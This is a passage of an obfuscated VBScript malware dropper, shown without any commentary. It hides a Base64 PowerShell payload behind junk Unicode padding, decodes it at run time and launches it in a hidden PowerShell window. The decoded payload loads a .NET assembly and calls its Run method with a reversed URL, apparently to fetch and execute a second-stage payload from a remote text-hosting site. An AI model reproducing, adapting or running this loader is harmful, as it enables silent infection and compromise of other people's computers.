ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥KQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥gỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Ckỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Iỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥pỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Dsỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥WwBzỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Hkỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥cwB0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GUỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥bQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥uỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥EEỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥cỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Bwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥EQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥bwBtỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GEỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥aQBuỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Ogỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥6ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥EMỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥dQByỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HIỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ZQBuỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Rỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Bvỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥G0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥YQBpỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥G4ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥LgBMỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥G8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥YQBkỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Cgỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Jỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Bnỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Hcỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥eỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥B6ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Gkỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥KQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥uỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Ecỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ZQB0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥FQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥eQBwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GUỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Kỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥nỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥E0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥YQByỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GEỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥YwBhỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Gkỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥YgBvỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥C4ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥QwBsỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GEỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥cwBzỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥DEỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Jwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥pỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥C4ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥RwBlỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥TQBlỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥aỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Bvỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Kỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥nỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥E0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥cwBxỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥EIỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥SQBiỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Fkỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Jwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥pỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥C4ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥SQBuỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HYỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥bwBrỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GUỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Kỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥kỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥G4ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥dQBsỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Gwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Lỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥gỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Fsỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥bwBiỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Goỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ZQBjỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥WwBdỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Iỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥oỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Ccỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Mỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥vỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Foỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥eỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥BIỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥FMỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Vgỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥vỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥LwBlỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GUỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥LgBlỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥cwBhỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Hỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Lwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥vỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Doỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥cwBwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥dỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Boỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Ccỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Iỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥sỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Cỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Jỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Bhỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Hỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥egBzỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Goỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Iỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥sỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Cỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥JwBfỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥XwBfỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥XwBfỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥XwBfỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥XwBfỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥XwBfỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥XwBfỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥XwBfỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥XwBfỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥XwBfỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥XwBfỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥XwBfỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥XwBfỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥XwBfỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥XwBfỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥LQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥tỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥C0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥LQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥tỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥C0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥LQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥nỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Cwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Iỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥kỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HUỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ZgByỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GMỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥cỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥sỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Cỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Jwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥xỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Ccỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Lỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥gỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Ccỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥UgBvỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥YQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥nỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Cỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥KQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥pỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Dsỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥")
dim cqupr

cqupr = ("$MkplqW = '") & NTpH & "'" 
cqupr = cqupr & ";$KByHL = [system.Text.Encoding]::Unicode.GetString( "



cqupr = cqupr & "[system.Convert]::FromBase64String( $MkplqW.replace('ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥','A') ) )"


cqupr = cqupr & ";$KByHL = $KByHL.replace('%pzAcOgInMr%', '" & ARmxU & "');powershell -command $KByHL;" 



set gjlqw =  CreateObject("WScript.Shell")
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
gjlqw.Run "powershell -command " & (cqupr) , 0, false

